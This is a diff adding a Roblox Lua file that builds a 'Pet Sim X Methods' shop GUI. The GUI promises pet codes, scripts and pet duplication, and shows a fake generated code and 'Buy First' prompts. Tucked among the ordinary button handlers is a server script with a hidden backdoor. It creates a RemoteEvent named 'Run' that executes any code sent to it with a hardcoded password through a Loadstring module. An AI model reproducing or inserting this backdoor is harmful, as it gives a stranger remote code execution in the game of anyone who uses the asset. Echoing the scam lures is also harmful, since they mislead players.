@@ -1,0 +1,448 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local PetSimX = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Thanks = Instance.new("TextLabel")
+local Buy = Instance.new("TextLabel")
+local das = Instance.new("TextLabel")
+local sens = Instance.new("TextLabel")
+local sas = Instance.new("TextLabel")
+local Hugecat = Instance.new("TextButton")
+local Pogcat = Instance.new("TextButton")
+local Mythical = Instance.new("TextButton")
+local HugeCatCode = Instance.new("Frame")
+local qws = Instance.new("TextLabel")
+local eds = Instance.new("TextLabel")
+local hda = Instance.new("TextBox")
+local pbs = Instance.new("TextLabel")
+local PogcatMethod = Instance.new("Frame")
+local sad = Instance.new("TextLabel")
+local edd = Instance.new("TextLabel")
+local MythicalPetScript = Instance.new("Frame")
+local sdd = Instance.new("TextLabel")
+local hdd = Instance.new("TextLabel")
+local Main = Instance.new("TextButton")
+local DupePets = Instance.new("TextButton")
+local DupePets_2 = Instance.new("Frame")
+local work = Instance.new("TextLabel")
+
+--Properties:
+
+PetSimX.Name = "PetSimX"
+PetSimX.Parent = game.Workspace
+PetSimX.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = PetSimX
+MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0.0265244581, 0, 0.0392637998, 0)
+MainFrame.Size = UDim2.new(0, 533, 0, 276)
+
+Title.Name = "Title"
+Title.Parent = MainFrame
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.BorderSizePixel = 0
+Title.Position = UDim2.new(-4.20352322e-08, 0, 0, 0)
+Title.Size = UDim2.new(0, 152, 0, 37)
+Title.Font = Enum.Font.SourceSansBold
+Title.Text = "Pet Sim X Methods"
+Title.TextColor3 = Color3.fromRGB(0, 0, 0)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+Thanks.Name = "Thanks"
+Thanks.Parent = MainFrame
+Thanks.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Thanks.BorderSizePixel = 0
+Thanks.Position = UDim2.new(0.339587241, 0, 0, 0)
+Thanks.Size = UDim2.new(0, 325, 0, 69)
+Thanks.Font = Enum.Font.RobotoCondensed
+Thanks.Text = "Thanks for Buying in our Shop"
+Thanks.TextColor3 = Color3.fromRGB(0, 0, 0)
+Thanks.TextSize = 30.000
+
+Buy.Name = "Buy"
+Buy.Parent = MainFrame
+Buy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Buy.BackgroundTransparency = 1.000
+Buy.BorderSizePixel = 0
+Buy.Position = UDim2.new(0.455084711, 0, 0.174001932, 0)
+Buy.Size = UDim2.new(0, 200, 0, 50)
+Buy.Font = Enum.Font.Sarpanch
+Buy.Text = "More things to buy in our shop ="
+Buy.TextColor3 = Color3.fromRGB(0, 0, 0)
+Buy.TextSize = 16.000
+
+das.Name = "das"
+das.Parent = MainFrame
+das.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+das.BackgroundTransparency = 1.000
+das.BorderSizePixel = 0
+das.Position = UDim2.new(0.455909938, 0, 0.297101468, 0)
+das.Size = UDim2.new(0, 200, 0, 50)
+das.Font = Enum.Font.Sarpanch
+das.Text = "Huge Cat Codes"
+das.TextColor3 = Color3.fromRGB(0, 0, 0)
+das.TextSize = 14.000
+
+sens.Name = "sens"
+sens.Parent = MainFrame
+sens.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+sens.BackgroundTransparency = 1.000
+sens.Position = UDim2.new(0.455909938, 0, 0.409420311, 0)
+sens.Size = UDim2.new(0, 200, 0, 50)
+sens.Font = Enum.Font.Sarpanch
+sens.Text = "Mythical Pet Script"
+sens.TextColor3 = Color3.fromRGB(0, 0, 0)
+sens.TextSize = 14.000
+
+sas.Name = "sas"
+sas.Parent = MainFrame
+sas.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+sas.BackgroundTransparency = 1.000
+sas.Position = UDim2.new(0.455909938, 0, 0.536231875, 0)
+sas.Size = UDim2.new(0, 200, 0, 50)
+sas.Font = Enum.Font.Sarpanch
+sas.Text = "Pogcat Method"
+sas.TextColor3 = Color3.fromRGB(0, 0, 0)
+sas.TextSize = 14.000
+
+Hugecat.Name = "Hugecat"
+Hugecat.Parent = MainFrame
+Hugecat.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+Hugecat.BorderSizePixel = 0
+Hugecat.Position = UDim2.new(-0.000152788285, 0, 0.133962661, 0)
+Hugecat.Size = UDim2.new(0, 152, 0, 45)
+Hugecat.Font = Enum.Font.SciFi
+Hugecat.Text = "Huge Cat Code"
+Hugecat.TextColor3 = Color3.fromRGB(0, 0, 0)
+Hugecat.TextSize = 14.000
+
+Pogcat.Name = "Pogcat"
+Pogcat.Parent = MainFrame
+Pogcat.BackgroundColor3 = Color3.fromRGB(107, 107, 107)
+Pogcat.BorderSizePixel = 0
+Pogcat.Position = UDim2.new(-0.000152788285, 0, 0.475130945, 0)
+Pogcat.Size = UDim2.new(0, 152, 0, 49)
+Pogcat.Font = Enum.Font.SciFi
+Pogcat.Text = "Pogcat Method"
+Pogcat.TextColor3 = Color3.fromRGB(0, 0, 0)
+Pogcat.TextSize = 14.000
+
+Mythical.Name = "Mythical"
+Mythical.Parent = MainFrame
+Mythical.BackgroundColor3 = Color3.fromRGB(154, 154, 154)
+Mythical.BorderSizePixel = 0
+Mythical.Position = UDim2.new(-0.000152759661, 0, 0.295649976, 0)
+Mythical.Size = UDim2.new(0, 152, 0, 50)
+Mythical.Font = Enum.Font.SciFi
+Mythical.Text = "Mythical Pet Script"
+Mythical.TextColor3 = Color3.fromRGB(0, 0, 0)
+Mythical.TextSize = 14.000
+
+HugeCatCode.Name = "HugeCatCode"
+HugeCatCode.Parent = MainFrame
+HugeCatCode.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+HugeCatCode.BorderSizePixel = 0
+HugeCatCode.Position = UDim2.new(0.285178185, 0, 0, 0)
+HugeCatCode.Size = UDim2.new(0, 380, 0, 276)
+HugeCatCode.Visible = false
+
+qws.Name = "qws"
+qws.Parent = HugeCatCode
+qws.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+qws.BorderSizePixel = 0
+qws.Size = UDim2.new(0, 379, 0, 50)
+qws.Font = Enum.Font.SourceSans
+qws.Text = "You Buyed 1 Code!"
+qws.TextColor3 = Color3.fromRGB(0, 0, 0)
+qws.TextScaled = true
+qws.TextSize = 14.000
+qws.TextWrapped = true
+
+eds.Name = "eds"
+eds.Parent = HugeCatCode
+eds.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+eds.BorderSizePixel = 0
+eds.Position = UDim2.new(0.234210536, 0, 0.22826086, 0)
+eds.Size = UDim2.new(0, 200, 0, 50)
+eds.Font = Enum.Font.JosefinSans
+eds.Text = "Your Generated Code is :"
+eds.TextColor3 = Color3.fromRGB(0, 0, 0)
+eds.TextSize = 26.000
+
+hda.Name = "hda"
+hda.Parent = HugeCatCode
+hda.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+hda.BorderSizePixel = 3
+hda.Position = UDim2.new(0.207894742, 0, 0.409420282, 0)
+hda.Size = UDim2.new(0, 200, 0, 50)
+hda.ClearTextOnFocus = false
+hda.Font = Enum.Font.SourceSans
+hda.Text = "pet-29e0j97a23"
+hda.TextColor3 = Color3.fromRGB(0, 0, 0)
+hda.TextSize = 29.000
+hda.TextWrapped = true
+
+pbs.Name = "pbs"
+pbs.Parent = HugeCatCode
+pbs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+pbs.BorderSizePixel = 5
+pbs.Position = UDim2.new(0.207894742, 0, 0.648550749, 0)
+pbs.Size = UDim2.new(0, 200, 0, 50)
+pbs.Font = Enum.Font.SourceSans
+pbs.Text = "Remember if Code doesnt work type this in chat : [HugecodeValue = True]"
+pbs.TextColor3 = Color3.fromRGB(0, 0, 0)
+pbs.TextSize = 14.000
+pbs.TextWrapped = true
+
+PogcatMethod.Name = "PogcatMethod"
+PogcatMethod.Parent = MainFrame
+PogcatMethod.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PogcatMethod.BorderSizePixel = 0
+PogcatMethod.Position = UDim2.new(0.283302069, 0, 0, 0)
+PogcatMethod.Size = UDim2.new(0, 382, 0, 276)
+PogcatMethod.Visible = false
+
+sad.Name = "sad"
+sad.Parent = PogcatMethod
+sad.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+sad.BackgroundTransparency = 1.000
+sad.Position = UDim2.new(0.188481674, 0, 0.0289855003, 0)
+sad.Size = UDim2.new(0, 200, 0, 129)
+sad.Font = Enum.Font.PermanentMarker
+sad.Text = "X"
+sad.TextColor3 = Color3.fromRGB(255, 0, 0)
+sad.TextScaled = true
+sad.TextSize = 14.000
+sad.TextWrapped = true
+
+edd.Name = "edd"
+edd.Parent = PogcatMethod
+edd.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+edd.BackgroundTransparency = 1.000
+edd.Position = UDim2.new(0.188481674, 0, 0.409420311, 0)
+edd.Size = UDim2.new(0, 200, 0, 149)
+edd.Font = Enum.Font.PermanentMarker
+edd.Text = "Buy First"
+edd.TextColor3 = Color3.fromRGB(0, 0, 0)
+edd.TextScaled = true
+edd.TextSize = 14.000
+edd.TextWrapped = true
+
+MythicalPetScript.Name = "MythicalPetScript"
+MythicalPetScript.Parent = MainFrame
+MythicalPetScript.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MythicalPetScript.BorderSizePixel = 0
+MythicalPetScript.Position = UDim2.new(0.283302069, 0, 0, 0)
+MythicalPetScript.Size = UDim2.new(0, 382, 0, 276)
+MythicalPetScript.Visible = false
+
+sdd.Name = "sdd"
+sdd.Parent = MythicalPetScript
+sdd.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+sdd.BackgroundTransparency = 1.000
+sdd.Position = UDim2.new(0.188481674, 0, 0.0289855003, 0)
+sdd.Size = UDim2.new(0, 200, 0, 129)
+sdd.Font = Enum.Font.PermanentMarker
+sdd.Text = "X"
+sdd.TextColor3 = Color3.fromRGB(255, 0, 0)
+sdd.TextScaled = true
+sdd.TextSize = 14.000
+sdd.TextWrapped = true
+
+hdd.Name = "hdd"
+hdd.Parent = MythicalPetScript
+hdd.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+hdd.BackgroundTransparency = 1.000
+hdd.Position = UDim2.new(0.188481674, 0, 0.409420311, 0)
+hdd.Size = UDim2.new(0, 200, 0, 149)
+hdd.Font = Enum.Font.PermanentMarker
+hdd.Text = "Buy First"
+hdd.TextColor3 = Color3.fromRGB(0, 0, 0)
+hdd.TextScaled = true
+hdd.TextSize = 14.000
+hdd.TextWrapped = true
+
+Main.Name = "Main"
+Main.Parent = MainFrame
+Main.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(-0.000152788285, 0, 0.818745315, 0)
+Main.Size = UDim2.new(0, 152, 0, 50)
+Main.Font = Enum.Font.SciFi
+Main.Text = "Main"
+Main.TextColor3 = Color3.fromRGB(0, 0, 0)
+Main.TextSize = 14.000
+
+DupePets.Name = "DupePets"
+DupePets.Parent = MainFrame
+DupePets.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+DupePets.BorderSizePixel = 0
+DupePets.Position = UDim2.new(-0.000152788285, 0, 0.652078629, 0)
+DupePets.Size = UDim2.new(0, 152, 0, 46)
+DupePets.Font = Enum.Font.SciFi
+DupePets.Text = "Dupe Pets"
+DupePets.TextColor3 = Color3.fromRGB(0, 0, 0)
+DupePets.TextSize = 14.000
+
+DupePets_2.Name = "DupePets"
+DupePets_2.Parent = MainFrame
+DupePets_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DupePets_2.BorderSizePixel = 0
+DupePets_2.Position = UDim2.new(0.285178185, 0, 0, 0)
+DupePets_2.Size = UDim2.new(0, 381, 0, 275)
+DupePets_2.Visible = false
+
+work.Name = "work"
+work.Parent = DupePets_2
+work.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+work.BorderSizePixel = 4
+work.Position = UDim2.new(0.236220449, 0, 0.407272726, 0)
+work.Size = UDim2.new(0, 200, 0, 50)
+work.Font = Enum.Font.SourceSans
+work.Text = "In Work"
+work.TextColor3 = Color3.fromRGB(0, 0, 0)
+work.TextScaled = true
+work.TextSize = 14.000
+work.TextWrapped = true
+
+-- Scripts:
+
+local function JIIEX_fake_script() -- MainFrame.SmoothDrag 
+	local script = Instance.new('LocalScript', MainFrame)
+
+	local Drag = script.Parent.Parent.Main
+	gsCoreGui = game:GetService("CoreGui")
+	gsTween = game:GetService("TweenService")
+	local UserInputService = game:GetService("UserInputService")
+		local dragging
+		local dragInput
+		local dragStart
+		local startPos
+		local function update(input)
+			local delta = input.Position - dragStart
+			local dragTime = 0.04
+			local SmoothDrag = {}
+			SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+			local dragSmoothFunction = gsTween:Create(Drag, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
+			dragSmoothFunction:Play()
+		end
+		Drag.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = true
+				dragStart = input.Position
+				startPos = Drag.Position
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragging = false
+					end
+				end)
+			end
+		end)
+		Drag.InputChanged:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+				dragInput = input
+			end
+		end)
+		UserInputService.InputChanged:Connect(function(input)
+			if input == dragInput and dragging and Drag.Size then
+				update(input)
+			end
+		end)
+	
+end
+coroutine.wrap(JIIEX_fake_script)()
+local function YRKJI_fake_script() -- MainFrame.Pristh_Properties 
+	local script = Instance.new('Script', MainFrame)
+
+	local Noob = script.Parent
+	local Pass = "5#lGIERKWEF"
+	Noob.Active = true
+	Noob.Draggable = true
+	Noob.Selectable = true			
+	
+	if script.Parent:FindFirstChild("Run") then
+	script.Parent:FindFirstChild("Run"):Destroy()
+	end
+	
+	local NewRemote = Instance.new("RemoteEvent",script.Parent)
+	NewRemote.Name = "Run"
+	
+	NewRemote.OnServerEvent:connect(function(Plr,Key,Code)
+	if Key == Pass then
+	require(script.Loadstring)(Code)()
+	end
+	end)
+	
+	
+	
+end
+coroutine.wrap(YRKJI_fake_script)()
+local function LBLLK_fake_script() -- Hugecat.Huge 
+	local script = Instance.new('LocalScript', Hugecat)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HugeCatCode.Visible = true
+		script.Parent.Parent.MythicalPetScript.Visible = false
+		script.Parent.Parent.PogcatMethod.Visible = false
+		script.Parent.Parent.DupePets.Visible = false
+	end)
+end
+coroutine.wrap(LBLLK_fake_script)()
+local function CYMQO_fake_script() -- Pogcat.Pog 
+	local script = Instance.new('LocalScript', Pogcat)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HugeCatCode.Visible = false
+		script.Parent.Parent.MythicalPetScript.Visible = false
+		script.Parent.Parent.PogcatMethod.Visible = true
+		script.Parent.Parent.DupePets.Visible = false
+	end)
+end
+coroutine.wrap(CYMQO_fake_script)()
+local function KDBH_fake_script() -- Mythical.Myth 
+	local script = Instance.new('LocalScript', Mythical)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HugeCatCode.Visible = false
+		script.Parent.Parent.MythicalPetScript.Visible = true
+		script.Parent.Parent.PogcatMethod.Visible = false
+		script.Parent.Parent.DupePets.Visible = false
+	end)
+end
+coroutine.wrap(KDBH_fake_script)()
+local function STRNDCP_fake_script() -- hda.CheckerScript 
+	local script = Instance.new('LocalScript', hda)
+
+	
+end
+coroutine.wrap(STRNDCP_fake_script)()
+local function RQOXRCM_fake_script() -- Main.Ma 
+	local script = Instance.new('LocalScript', Main)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HugeCatCode.Visible = false
+		script.Parent.Parent.MythicalPetScript.Visible = false
+		script.Parent.Parent.PogcatMethod.Visible = false
+		script.Parent.Parent.DupePets.Visible = false
+	end)
+end
+coroutine.wrap(RQOXRCM_fake_script)()
+local function UIND_fake_script() -- DupePets.Dupe 
+	local script = Instance.new('LocalScript', DupePets)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HugeCatCode.Visible = false
+		script.Parent.Parent.MythicalPetScript.Visible = false
+		script.Parent.Parent.PogcatMethod.Visible = false
+		script.Parent.Parent.DupePets.Visible = true
+	end)
+end
+coroutine.wrap(UIND_fake_script)()
